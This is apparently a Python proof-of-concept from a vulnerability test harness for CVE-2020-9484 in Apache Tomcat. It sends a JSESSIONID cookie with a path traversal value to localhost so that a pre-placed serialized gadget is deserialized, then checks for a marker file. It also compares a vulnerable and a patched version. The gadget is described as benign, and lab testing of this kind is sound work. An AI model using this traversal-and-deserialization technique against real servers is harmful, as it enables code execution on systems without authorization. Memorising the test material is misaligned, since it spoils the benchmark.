#!/usr/bin/env python3
"""CVE-2020-9484 original PoC -- path traversal via JSESSIONID to FileStore.

The JSESSIONID cookie is crafted to traverse out of the FileStore directory
to /tmp/payload.session, which contains a serialized BenignMarker gadget.
When FileStore.load() deserializes the file, BenignMarker.readObject() writes
the PCB_FLAG to /tmp/pcb_marker.jsp (read via marker.jsp).

Expected behaviour:
  V0 (9.0.34): No path validation -- deserialization succeeds, marker written.
  V1 (9.0.35): String.startsWith() path check blocks traversal outside store dir.
"""

import requests
import time


def run(host: str = "127.0.0.1", port: int = 8080, flag: str = "") -> str:
    """Send the CVE-2020-9484 path-traversal request and check for the marker."""
    base = f"http://{host}:{port}"

    # The FileStore directory is /usr/local/tomcat/sessions.
    # We traverse up to / and then into /tmp/payload (FileStore appends .session).
    traversal_id = "../../../../tmp/payload"

    # Step 1: Send request with crafted JSESSIONID to trigger deserialization
    try:
        requests.get(
            f"{base}/index.html",
            cookies={"JSESSIONID": traversal_id},
            timeout=10,
        )
    except requests.RequestException:
        pass  # Server may error on bad session, that's expected

    # Brief pause for filesystem write to complete
    time.sleep(1)

    # Step 2: Check if the marker file was written (deserialization side-effect)
    try:
        resp = requests.get(f"{base}/marker.jsp", timeout=5)
        return resp.text.strip()
    except requests.RequestException:
        return ""
